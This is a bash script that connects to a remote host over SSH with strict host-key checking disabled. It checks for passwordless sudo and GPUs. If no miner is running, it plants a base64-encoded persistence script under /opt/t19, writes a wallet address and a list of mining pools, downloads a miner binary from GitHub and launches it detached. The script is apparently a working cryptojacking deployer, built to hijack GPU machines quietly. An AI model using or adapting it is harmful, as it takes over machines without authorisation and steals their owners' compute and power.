#!/bin/bash
ip=$1; u=$2; k=$3
S() { ssh -i "$k" -o "ProxyCommand=/tmp/p24.sh %h %p" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 "$u@$ip" "$@"; }
echo "--- H4 $ip user=$u key=$(basename $k)"
S 'id; hostname; hostname -I; sudo -n true && echo SUDO_OK; sudo -n nvidia-smi -L 2>/dev/null; sudo -n nvidia-smi --query-gpu=index,name,memory.total,serial,uuid --format=csv,noheader 2>/dev/null; echo ARGV:; pgrep -af "peakminer|srb|run-g|keep.sh" | head -8; echo T19:; ls -la /opt/t19 /opt/nv 2>/dev/null | head -12' 2>&1
echo "--- RUNNERCHK $ip"
S 'sudo -n bash -s' < /tmp/runnerchk.sh 2>&1 | head -25
G=$(S 'sudo -n nvidia-smi -L 2>/dev/null | grep -c ^GPU' 2>/dev/null | tail -1 | tr -d '\r')
M=$(S 'pgrep -c -f "peakminer|srb "' 2>/dev/null | tail -1 | tr -d '\r')
echo "--- H4 $ip gpus=${G:-?} miners=${M:-?}"
if [ "${G:-0}" -ge 1 ] 2>/dev/null && [ "${M:-0}" -eq 0 ] 2>/dev/null; then
  KEEP=$(base64 -w0 /tmp/kc/keep.sh)
  S "sudo -n mkdir -p /opt/t19 /var/log/t19; echo $KEEP | base64 -d | sudo -n tee /opt/t19/keep.sh >/dev/null; sudo -n chmod 755 /opt/t19/keep.sh; printf 'WALLET=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz\nBASE=ul-%s\nPOOLARGS=\"-o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://pool.pearlhash.xyz:9000\"\n' $(echo $ip | tr . -) | sudo -n tee /etc/t19-worker >/dev/null; if [ ! -x /opt/t19/peakminer ]; then sudo -n curl -fsSL -m 300 -o /opt/t19/peakminer https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9-linux-x86_64; sudo -n chmod +x /opt/t19/peakminer; fi; sudo -n ls -l /opt/t19/peakminer /etc/t19-worker" 2>&1
  S 'sudo -n bash -c "setsid nohup /opt/t19/keep.sh >/dev/null 2>&1 & sleep 8; pgrep -af peakminer | head -4"' 2>&1
  sleep 95
  S 'sudo -n bash -c "grep -ahoE \"accepted \\([0-9]+/[0-9]+\\)|difficulty [0-9]+|[0-9.]+ TH/s|spawn g[0-9]+\" /var/log/t19/g*.log 2>/dev/null | tail -12; echo MINERS=\$(pgrep -c -f peakminer)"' 2>&1
fi
